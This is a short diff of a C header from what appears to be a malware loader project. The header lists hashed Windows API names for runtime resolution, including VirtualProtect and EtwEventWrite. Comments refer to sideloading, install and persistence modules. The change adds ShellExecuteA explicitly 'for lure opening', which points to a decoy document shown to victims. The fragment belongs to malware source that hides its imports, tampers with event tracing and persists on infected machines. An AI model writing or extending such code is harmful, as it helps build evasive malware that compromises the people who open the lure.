@@ -59,11 +59,12 @@
 #define VirtualProtect_JOAAT            0x69B260D2
 #define EtwEventWrite_JOAAT             0xEF9B6F9B
 
-// ----------- Bind File Discovery (kernel32 exports) -----------
+// ----------- Bind File Discovery (kernel32 / shell32 exports) -----------
 #define FindFirstFileA_JOAAT            0xBEB8D600
 #define FindNextFileA_JOAAT             0x5D8A9C6B
 #define FindClose_JOAAT                 0x1FF88458
 #define GetCommandLineA_JOAAT           0x14D7236E  // persistence-launch guard in Sideload.c
+#define ShellExecuteA_JOAAT             0xF81D35ED  // shell32!ShellExecuteA for lure opening
 
 // ----------- Install.c / Persist.c (kernel32) -----------
 #define GetModuleFileNameW_JOAAT        0x6EEA1E33
